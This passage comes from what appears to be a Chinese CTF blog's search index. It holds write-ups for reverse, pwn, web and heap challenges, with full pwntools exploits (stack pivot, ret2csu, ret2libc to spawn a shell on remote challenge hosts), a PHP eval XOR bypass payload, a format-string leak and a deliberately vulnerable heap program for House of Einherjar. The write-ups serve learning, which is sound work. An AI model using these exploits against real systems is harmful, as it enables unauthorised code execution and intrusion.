&lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\nreturn String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122)判断读入的字符大小写情况 并返回ascii码值并且为下面的判断规定了范围\n\n(c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;将当前字符的ascii码值加13后进行一个判断 如果大于Z或者z 则-26如果没有大于就返回加13后的值也就是常规的凯撒密码 偏移量是13 找到下方的密文 进行凯撒变化后 得到flag\n\n&#67;&#x6c;&#105;&#x65;&#x6e;&#116;&#x53;&#105;&#x64;&#101;&#76;&#111;&#x67;&#105;&#110;&#x73;&#65;&#x72;&#101;&#x45;&#97;&#x73;&#x79;&#x40;&#x66;&#x6c;&#97;&#x72;&#x65;&#x2d;&#111;&#x6e;&#46;&#99;&#x6f;&#x6d;\n","categories":["reverse"]},{"title":"Black Watch 入群题","url":"/2022/11/18/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98/","content":"做的时候发现忘记了好多知识点 复现一下 不然本来这题的知识点以前的博客都有讲到\n[*] &#x27;/home/chen/pwn&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n没开金丝雀和pie 32位 ida看看\nssize_t vul_function()&#123;  size_t v0; // eax  size_t v1; // eax  char buf[24]; // [esp+0h] [ebp-18h] BYREF  v0 = strlen(m1);  write(1, m1, v0);  read(0, &amp;s, 0x200u);  v1 = strlen(m2);  write(1, m2, v1);  return read(0, buf, 0x20u);&#125;\n\n关键函数 给了两次溢出的机会 第二次只能溢出两个字长 看到这里就应该反应过来是栈迁移\n第一个read写入的地址是bss段\n这里我一开始想的是写入shellcode 打不通后仔细想了想 重新学习了NX保护\nNX保护简单理解就是使内存页的数据不可执行\n那为什么我们可以构造rop链呢 因为rop链的执行流控制是利用栈帧的ret指令来实现的\nfrom pwn import*def libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27820elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;What is your name?&quot;)puts_plt = 0x8048350write_plt = 0x8048380write_got = elf.got[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)bss_addr = 0x804A300leave_addr = 0x08048408payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)write_addr = u32(io.recv())system_addr,binsh_addr = libcmath(write_addr,&#x27;write&#x27;)io.recvuntil(&quot;What is your name?&quot;)payload = p32(system_addr)+p32(0)+p32(binsh_addr)io.send(payload)\n\n说一下思路吧  第一个read构造write泄露基址 然后要返回main函数 进行下一次的system系统调用\n然后栈迁移到对应的地址-4  这里的-4前面的专门讲解栈迁移的篇幅有提到\n接下来就是构造system的链 然后执行了\nexp:\nfrom pwn import*def libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27820elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;What is your name?&quot;)puts_plt = 0x8048350write_plt = 0x8048380write_got = elf.got[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)bss_addr = 0x804A300leave_addr = 0x08048408payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)write_addr = u32(io.recv())system_addr,binsh_addr = libcmath(write_addr,&#x27;write&#x27;)io.recvuntil(&quot;What is your name?&quot;)payload = p32(system_addr)+p32(0)+p32(binsh_addr)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)io.interactive()\n\n","categories":["wp"]},{"title":"HNCTF2022.ret2csu","url":"/2022/10/06/HNCTF2022-ret2csu/","content":"看一下保护机制\n\n再拖到ida里看一下\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(_bss_start, 0LL);  write(1, &quot;Start Your Exploit!\\n&quot;, 0x14uLL);  vuln();  return 0;&#125;\n\nssize_t vuln()&#123;  char buf[256]; // [rsp+0h] [rbp-100h] BYREF  write(1, &quot;Input:\\n&quot;, 7uLL);  read(0, buf, 0x200uLL);  return write(1, &quot;Ok.\\n&quot;, 4uLL);&#125;\n\n主体部分非常简洁 但是没有任何后门函数和泄露真实地址的地方\n一开始我们会想自己构造rop链\n通过ROPgadget来寻找rdi rsi rdx三个寄存器的传参汇编地址\n我们来看一下能否找到我们想要的汇编\n\n可以看到并没有rdx\n但是仍然还存在一种可能，我们gdb看一下当我们read数据的时候 rdx寄存器的值是多少\n\n可以看到是0x4 显然没有办法成为我们调用wirte函数的参数(因为其是作为第三个参数size存在的，这样我们只能输出4个字节的数据)\n所以此时我们回忆一下，有没有什么万能的rop链？欸 一想还真有 叫ret2csu(相关的介绍在栈部分里有)\n.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000401290                 mov     rdx, r14.text:0000000000401293                 mov     rsi, r13.text:0000000000401296                 mov     edi, r12d.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8].text:000000000040129D                 add     rbx, 1.text:00000000004012A1                 cmp     rbp, rbx.text:00000000004012A4                 jnz     short loc_401290.text:00000000004012A6.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j.text:00000000004012A6                 add     rsp, 8.text:00000000004012AA                 pop     rbx.text:00000000004012AB                 pop     rbp.text:00000000004012AC                 pop     r12.text:00000000004012AE                 pop     r13.text:00000000004012B0                 pop     r14.text:00000000004012B2                 pop     r15.text:00000000004012B4                 retn\n\n我们再看一下程序给了我们哪些函数\n\n那么思路直接有了 这里用write函数 然后通过csu汇编代码将参数传给寄存器 这样我们就能泄露出write函数的真实地址了(也可以是其他的)\n泄露出来以后 就是ret2libc的知识点了 思路捋清了 直接看exp吧\nfrom pwn import*io = remote(&quot;43.143.7.97&quot;,28657)libc = ELF(&quot;libc.so.6&quot;)elf = ELF(&quot;./ret2csu&quot;)gadget2_addr = 0x4012A6gadget1_addr = 0x401290vuln_addr = 0x401176rdi_addr = 0x4012b3write_got = elf.got[&#x27;write&#x27;]io.recvuntil(&quot;Input:&quot;)payload1 = cyclic(0x100+0x8)+p64(gadget2_addr)+cyclic(8)+p64(0)+p64(1)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(gadget1_addr)+cyclic(56)+p64(vuln_addr)io.sendline(payload1)io.recvuntil(&quot;Ok.\\n&quot;)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]hex(libc_addr)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]hex(system_addr)binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))hex(binsh_addr)io.recvuntil(&quot;Input:\\n&quot;)payload2 = cyclic(0x108)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)io.sendline(payload2)io.interactive()\n\n","categories":["wp"]},{"title":"HUBUCTF 2022 新生赛","url":"/2022/11/22/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B/","content":"HowToGetShell&lt;?phpshow_source(__FILE__);$mess=$_POST[&#x27;mess&#x27;];if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;    die(&quot;invalid input!&quot;);&#125;eval($mess);\n\n代码审计题 提供了eval函数 并且我们可以输入参数 但是preg_match正则匹配了字母 所以我们无法使用常规字符来构造payload 使得泄露flag\nhttps://blog.csdn.net/qq_38154820/article/details/106330233/\n翻阅到这篇文章 这里选择难度最为简单的异或办法 由两个字符串异或得到我们想要的字符串\nvalid = &quot;1234567890!@$%^*()&#123;&#125;[];\\&#x27;\\&quot;,.&lt;&gt;/?-=_`~ &quot;  answer = &quot;phpinfo&quot;  tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;for c in answer:    for i in valid:        for j in valid:            if (ord(i)^ord(j) == ord(c)):                tmp1 += i                tmp2 += j                break        else:            continue        breakprint(tmp1,tmp2)\n\n0302181 @[@[_^^\n\npayload:\nmess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();\n\n这里因为屏蔽了所有的字母 所以无法直接调用mess 只能通过命名一个参数为_然后调用这个参数\n","categories":["web"]},{"title":"HUBUCTF.新生赛.ez_pwn","url":"/2022/09/17/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-pwn/","content":"ps:本题思路由youlin师傅指引\nchecksec一下，查看一下保护机制\n\n保护全开 64位？有点被吓到了\n不过这种题估计都是flag已经准备好了或者自带shellcode\n拖进ida看看\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+4h] [rbp-8Ch] BYREF  int i; // [rsp+8h] [rbp-88h]  int v6; // [rsp+Ch] [rbp-84h]  unsigned int seed[2]; // [rsp+10h] [rbp-80h]  FILE *stream; // [rsp+18h] [rbp-78h]  char v9[32]; // [rsp+20h] [rbp-70h] BYREF  char s[8]; // [rsp+40h] [rbp-50h] BYREF  __int64 v11; // [rsp+48h] [rbp-48h]  __int64 v12; // [rsp+50h] [rbp-40h]  __int64 v13; // [rsp+58h] [rbp-38h]  __int64 v14; // [rsp+60h] [rbp-30h]  __int64 v15; // [rsp+68h] [rbp-28h]  __int64 v16; // [rsp+70h] [rbp-20h]  __int64 v17; // [rsp+78h] [rbp-18h]  unsigned __int64 v18; // [rsp+88h] [rbp-8h]  v18 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  *(_QWORD *)seed = time(0LL);  *(_QWORD *)s = 0LL;  v11 = 0LL;  v12 = 0LL;  v13 = 0LL;  v14 = 0LL;  v15 = 0LL;  v16 = 0LL;  v17 = 0LL;  puts(&quot;Who goes there?&quot;);  gets(v9);  printf(&quot;Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\\n&quot;, v9);  srand(seed[0]);  for ( i = 0; i &lt;= 99; ++i )  &#123;    v6 = rand() % 100000 + 1;    puts(&quot;I am thinking of a number from 1-100000. What is it?&quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v4);    if ( v6 != v4 )    &#123;      puts(&quot;You have failed. Goodbye.&quot;);      return 0;    &#125;    puts(&quot;Impressive.&quot;);  &#125;  puts(&quot;You&#x27;ve guessed all of my numbers. Here is your reward.&quot;);  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);  if ( stream )  &#123;    fgets(s, 50, stream);    puts(s);  &#125;  puts(&quot;Goodbye.&quot;);  return 0;&#125;\n\n用时间做了种子，循环一百次，每次都随机一个数，我们需要输对这个数，算是经典的猜数字吧\n一开始看到我们可以自定义赋值的v4和随机数v6是相邻的字节，所以想通过溢出来覆盖v6，使得if判断成立，不过貌似不行\n所以还是正常做法吧\n随机数，我目前知道的两种做法，一种是溢出数据覆盖seed，这样我们在知晓种子的值的情况下，因为c语言的rand是伪随机(下面就要降到了，我知道你很急，但你先别急)，所以就可以知道随机数的值\n还有一种办法是本题将要使用到的，这道题我们可以发现他是用当前时间作为种子，来生成随机数，所以我们只要在exp中也是用当前时间作为种子，就可以得到一样的随机数（这里看不懂的话，是伪随机的概念不清楚）\nfrom pwn import *from ctypes import *io=remote(&quot;1.14.71.254&quot;,28056)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)seed = libc.time(0)libc.srand(seed)io.sendlineafter(b&#x27;Who goes there?&#x27;, b&#x27;chen&#x27;)for i in range(100):    buf = libc.rand() % 100000 + 1    io.sendlineafter(b&#x27;What is it?&#x27;, str(buf))    io.recvuntil(b&#x27;\\n&#x27;)\n\n几个疑点\n1.cdll.LoadLibrary的用法：看了很多篇猜数字的题解啊，竟然没有一个人对这个函数用法有解释，那没办法了，只能自己wiki了\n这个函数就是在python中重新加载文件库\n还是有限制的：在64位的windows系统中，一个64位进程不能加载一个32位dll，同理一个32位进程也不能加载一个64位dll。\n查资料的时候还看到这个限制的特殊情况，不过看不明白，估计了解的价值也不大，先丢在这，有空来填这个坑，感兴趣的可以自己先看(3条消息) python 调用 C++ dll 32位 64位 问题 ctypes.cdll.LoadLibrary_wowocpp的博客-CSDN博客_python调用32位dll\n还有一种更深的用法是这个代码库将允许原生Linux程序从一个WindowsDLL文件中加载或调用功能函数\n(3条消息) linux运行dll文件命令,LoadLibrary：一款能够允许Linux程序从DLL文件中加载或调用函数的工具…_七分醉玲珑的博客-CSDN博客\n因为涉及到linux和windows的进程间通信和内核相关知识，我自己也还没有搞懂，留个坑吧，看以后有没有时间填上\n2.伪随机这里介绍一下c语言中的伪随机\n一些基础的c语言知识这里就不多解释了，比如说srand用法和种子的概念\n先看看一段代码吧\nint main()&#123;   for(int i=0; i&lt;10; i++)\t  &#123;\t    printf(&quot;%4d&quot;,rand());\t  &#125;   printf(&quot;\\n&quot;);   return 0;&#125;\n\n输出10个随机数，我们两次运行试试\n\n生成的随机数都一样？\n我们不妨这么理解，所谓的rand函数就是根据每个种子分配一张表格，所谓的随机数是从这个表格调用的，所以当我们第二次运行时，由于种子没改变，那么这张表格的数据也不会改变\n那么我们如何获得真正意义上的随机数？想一下有什么东西的数据是一直在变化的\n我们把目光瞄向时间，函数srand( (unsigned)time( NULL ) ) 中time返回的是1970年1月1日0点到现在时间流失的秒数值\n因此，我们这下没法得知种子是多少，也就无法知道这个种子对应的随机数表是什么\n但是我们重加载了libc库，同步获取了time返回的种子值，由于time是以秒作为单位的，我们每次for循环得出的随机数和题目的随机数几乎没有差距，所以这道题的随机数就呼之欲出了\n","categories":["wp"]},{"title":"HUBUCTF-新生赛-fmt","url":"/2022/09/18/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt/","content":"老规矩走个流程，checksec看一下保护机制\n\n好像看不出什么，猜不出他想干啥，拖到ida里面瞧瞧\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  FILE *stream; // [rsp+8h] [rbp-68h]  char format[32]; // [rsp+10h] [rbp-60h] BYREF  char s[8]; // [rsp+30h] [rbp-40h] BYREF  __int64 v6; // [rsp+38h] [rbp-38h]  __int64 v7; // [rsp+40h] [rbp-30h]  __int64 v8; // [rsp+48h] [rbp-28h]  __int64 v9; // [rsp+50h] [rbp-20h]  __int64 v10; // [rsp+58h] [rbp-18h]  __int16 v11; // [rsp+60h] [rbp-10h]  unsigned __int64 v12; // [rsp+68h] [rbp-8h]  v12 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);                                                                                                                                                                         setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);  *(_QWORD *)s = 0LL;  v6 = 0LL;  v7 = 0LL;  v8 = 0LL;  v9 = 0LL;  v10 = 0LL;  v11 = 0;  if ( stream )    fgets(s, 50, stream);  HIBYTE(v11) = 0;  while ( 1 )  &#123;                                       puts(&quot;Echo as a service&quot;);    gets(format);    printf(format);    putchar(10);  &#125;&#125;\n\n经典格式化字符串漏洞吧\n把flag.txt的内容存储在变量s里面，这题得用到gdb了\n教一个办法，像这种调用文件的，建议自己在本地建一个同名文件，方便查看文件在栈中的地址\n\n可以看到我们自己在本机创建的flag.txt此时位于栈上的位置\nAAAAAAAA就是我们在gets中输入的值\n所以我们可以知道flag和格式化字符串的偏移是11(有可能会有差错，所以我的建议是等下泄露flag的时候扩大范围多试几个)\n为什么是11？AAAAAAAA不是和flag只间隔了3个字长？这里是64位和32位栈传参的差异\n64位和32位栈传参我在初期栈学习中，就一直注重强调32位和64位的不同，因为我本人在初期学习中，就常常对这二者没有足够的分辨意识\n接下来着重讲解这二者的不同\n首先是我们之前已经详细讲过的32位传参\n具体的传参方式就是在栈上传参，并且根据system和call system调用的不同，参数和函数地址的偏移也不同\n我们在之前的阅读中，会注意到频繁出现的esp eip eax ebx等\n这里的e就是32位特有，64位情况下的寄存器，通常是以r开头。例如rsp\n64位传参的情况相较32位及其不同！！千万不要搞混\n在linux操作系统中，前六个参数通过 RDI 、 RSI 、 RDX 、 RCX 、 R8 和 R9 传递\n而在windows操作系统中，前四个参数通过 RCX 、 RDX 、 R8 和 R9 来传递\n他们的共同点是，其第七个&#x2F;第五个参数就push入栈进行传递(因此上面的偏移值才是6+5[5是从AAAAAAAA开始数到flag])\n既然已经清楚了大致的偏移量，我们开始传入格式化字符串吧、\n​                                                                             \n可以看到果然有些偏差，12才是正确的偏移量\n这里又有一个问题了，为什么我们看到的是16进制形式的，而不是字符串形式\n这就要从%x的用法着手分析了\nx是打印出无0x的16进制\n而我们换用%p试一下\n\n转化成字符串看一下\n7&#123;FTCSSN\n\n倒过来，是不是像一个flag的格式了，说明这题就是用%p\n这是为什么？%p和%x有什么区别？而且这里为什么又是倒转过来的？别急，慢慢讲\n1.为什么这里要用%p%p是打印出所指栈位置中的地址指向的地方的内容\n在搞懂这个问题前，我们得先知道，栈中是不会存储字符串的，这一点在栈溢出的时候就体现了出来\n我们给system传参的时候是binsh字符串的地址，而不是binsh字符串\n所以，看起来flag是存储到了栈中，其实只是他的地址被保存到了栈中\n2.为什么是倒转过来的这里涉及到了小端序和大端序的问题\n这二者都属于字节序，什么是字节序？为什么要有字节序？\n字节序指电脑内存中占用多个字节的数据的字节排列顺序\n在几乎所有的平台上，多字节对象都被存储为连续的字节序列\n为什么会有字节序，统一用大端序不行吗？答案是，计算机先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序。\n那么什么是小端序和大端序？\n大端序将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址\n小端序将一个多位数的低位放在较小的地址处，高位放在较大的地址处\n看不懂没关系，图文演示一下\n\n上图为小端序的存储状况，作为高位字节的12就放在了低地址\n而大端序的存储，就比较符合我们人类的阅读习惯\n这里因为大端序我们接触的少，再加上小端序已经作了详细的解释，同理可得，就不进行作图了(真的不是我懒)\n截止到现在，本题涉及到的知识点已经全部讲完了，如果想练练手的话，可以试试ctfshow中的pwn04(格式化字符串泄露canary)\n","categories":["wp"]},{"title":"House Of Einherjar","url":"/2023/03/02/House-Of-Einherjar/","content":"基于chunk overlapping的一种利用手法 旨在申请到任意地址的chunk\n前言题目源码 各种漏洞都有 并且打印了堆基址 同时不打算开启pie 方便调试\n//gcc -o testheap -no-pie testheap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];char magic_addr[1000];void bss_write()&#123;    puts(&quot;For commissioning only&quot;);    char *a[50];    read(0,a,0x50);    puts(&quot;Input content&quot;);    read(0,*a,0x100);&#125;void gift()&#123;    puts(&quot;Convenient debugging&quot;);    puts(&quot;Please enter the got table of the function&quot;);    char a[0x20];    read(0,a,0x20);    asm(        &quot;pop %rsi\\n\\t&quot;        &quot;mov $1,%rax\\n\\t&quot;        &quot;mov $1,%rdi\\n\\t&quot;        &quot;mov $8,%rdx\\n\\t&quot;        &quot;syscall\\n\\t&quot;    );    puts(&quot;Keep this gift&quot;);&#125;void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;Life is fucking movie&quot;);    puts(&quot;Life is always full of unhappiness, like this question&quot;);    puts(&quot;Anyway, what&#x27;s your answer&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    int index;    char size[20];    puts(&quot;What do you really want?&quot;);    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time);        puts(&quot;You can customize the size of chunk, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);        chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);        printf(&quot;chunk_addr is %x\\n&quot;,&amp;(*chunk_ptr[chunk_time]));        puts(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;error&quot;);            exit(0);        &#125;    &#125;else&#123;        exit(0);        puts(&quot;&quot;);    &#125;&#125;void delete()&#123;    char data[100];    int index;    puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    int chunksize;    puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;);    scanf(&quot;%d&quot;,&amp;chunksize);    puts(&quot;Come back!&quot;);    read(0,chunk_ptr[index],chunksize);&#125;void show()&#123;    puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to debug heap vulnerabilities&quot;);    puts(&quot;write by chen&quot;);    while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                gift();                break;            case 6:                bss_write();                break;            case 7:                puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;);                puts(&quot;You will be stronger next time I see you&quot;);                exit(0);                break;        &#125;    &#125;&#125;\n\n在上一篇文章中 我们介绍了利用修改prev_size里实现合并的手法 基于这个漏洞 我们更进一步来利用\n我们知道 如果topchunk相邻低地址处的chunk处于free状态 除开fastbin和tcachebin 那么top chunk就会将其合并 此时top chunk的首地址就会成为被合并的chunk的地址\n这其实是house of force的内容 不过这里我们并不直接修改top chunk的prev_size \n而是修改与top chunk物理相邻的chunk的prev_size\n首先我们需要知道 当plmalloc在处理后向合并的时候 新的chunk的地址是根据当前chunk减去prev_size得到的\n并且后向合并的前置条件是要通过两个检查\n\n假设此时我们已经在某个地方伪造好了fake chunk 并且此时堆结构如图所示\n为了实现chunkA后向合并到fake chunk 我们需要使得chunkA_addr - prev_size &#x3D; fakechunk_addr\nchunk_at_offset(p, -((long) prevsize))\n\n同时还需要使得fake_chunk的size域和chunkA的prev_size域相同\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\malloc_printerr (&quot;corrupted size vs. prev_size&quot;);\n\n并且还要注意一下fake chunk的fd域和bk域 根据unlink的要求 我们需要使得fake chunk的fd域和bk域满足下面要求\nif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);\n\n不过这个相对来说很好绕过 我们只需要让fd和bk域都为fake chunk的地址就行了 这样FD-&gt;bk 的值也还是fake chunk的地址 同理BK-&gt;fd也是\n同时还需要使得chunkA的inuse位为0 这样plmalloc才会认为chunkA低地址处存在一个位于bin的chunk 并且是可以合并的\nif (!prev_inuse(p)) &#123;prevsize = prev_size(p);size += prevsize;p = chunk_at_offset(p, -((long) prevsize));unlink(av, p, bck, fwd);&#125;\n\n根据上述要求 我们想要实现house of einherjar需要拥有以下条件\n1.拥有堆溢出的能力 可以覆盖到next chunk的prev_size域和size域的最后一位2.拥有在目标地址构造fake chunk的能力3.拥有堆的基址来计算fake chunk和chunk的差值\n\n下面我们开始实际利用\nlibc2.23我们假设题目自带了打印堆基址的功能\n并且可以在bss段中构造fake chunk的机会  实际利用情况里需要读者自己根据实际题目判断是否可行 以及如何实现\n本题目由笔者本人编写 漏洞点显而易见 仅供参考\nbss_addr = 0x602320chunk0_addr = add(0x10,b&#x27;aaaa&#x27;)chunk0_addr = chunk0_addr * 0x1000\n\n首先我们创建一个0x10大小的chunk 同时接收一下当前chunk的地址 也就是堆基址 这里之所以要乘以0x1000\n是因为我出题的时候使用的是printf来输出 其遇到\\x00就直接截断了 所以无法打印出堆基址后的三个0 这里需要自己补上\nadd(0x80,b&#x27;aaaa&#x27;)chunk1_addr = chunk0_addr + 0x20prev_size = chunk1_addr-bss_addrpayload = cyclic(0x10)+p64(prev_size)+b&#x27;\\x90&#x27;edit(0,len(payload),payload)\n\n随后我们再次申请一个chunk 这个chunk是用来实现本文漏洞的关键 最开始申请的chunk是用来堆溢出覆盖这个chunk的prev_size域和size域的inuse位\n接着我们计算出chunk1_addr 和 prev_size应该要被设置成的值\n接着利用chunk0的堆溢出漏洞覆盖chunk1的prev_size和inuse\n\n此时堆的结构如图所示\n接着在bss段上构造一个fake chunk 这里的函数是我为了方便演示特地写的 正常题目就别想了\npayload = p64(0x90)+p64(prev_size)+p64(bss_addr)*2bss_write(p64(bss_addr),payload)\n\n此时我们释放chunk1 看看其是否能过通过检查\n\n为什么是top chunk跑到了fake chunk这边呢 同时addr还和我们fake chunk不一样\n这是因为chunk1在和fake chunk合并之后 二者同样是一个物理相邻top chunk的堆块 所以top chunk就将其吞并\n而这个addr是单纯的显示问题 我们试着申请一个chunk 看看写入的content位于哪里\nadd(0x20,b&#x27;gggggggg&#x27;)\n\n\n可以看到写入成功\n接下来 难度升级 我们来试试如果题目没有给我们赠送堆基址 我们要如何自己获取堆基址并且实现漏洞的利用\nbss_addr = 0x602320add(0x10,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)delete(0)show(0)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x20success(&quot;heap_addr :&quot;+hex(heap_addr))\n\n首先我们申请两个任意大小的chunk  目的是为了将两个chunk放入到fastbin中 利用UAF获取其fd域内的堆地址 经过计算得到堆基址\n\n接着我们需要把这两个chunk从fastbin中取出来 否则等下unlink的时候就会报错 原因暂时不清楚\n\nadd(0x10,b&#x27;aaaa&#x27;)#2add(0x10,b&#x27;aaaa&#x27;)#3add(0x80,b&#x27;aaaa&#x27;)#4\n\n我们重新申请两个0x10大小的chunk 此时chunk2相当于chunk0 chunk3相当于chunk1\nchunk4则是用来向后合并 利用漏洞的\n接下来的手法就和之前的一致了\nprev_size = heap_addr + 0x40 - bss_addrpayload = cyclic(0x10)+p64(prev_size)+b&#x27;\\x90&#x27;edit(3,len(payload),payload)payload = p64(0x100)+p64(prev_size)+p64(bss_addr)*2bss_write(p64(bss_addr),payload)delete(4)\n","categories":["堆"]},{"title":"ISCTF2022-null","url":"/2022/11/02/ISCTF2022-null/","content":"看一下保护机制\n\n再拖到ida查看一下main函数\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.ADD&quot;);      puts(&quot;2.CHANGE&quot;);      puts(&quot;3.PRINT&quot;);      puts(&quot;4.DEL&quot;);      putchar(&#x27;:&#x27;);      __isoc99_scanf(&quot;%d&quot;, &amp;v3);      if ( v3 != 2 )        break;      edit();    &#125;    if ( v3 &gt; 2 )    &#123;      if ( v3 == 3 )      &#123;        print();      &#125;      else if ( v3 == 4 )      &#123;        del();      &#125;      else      &#123;LABEL_13:        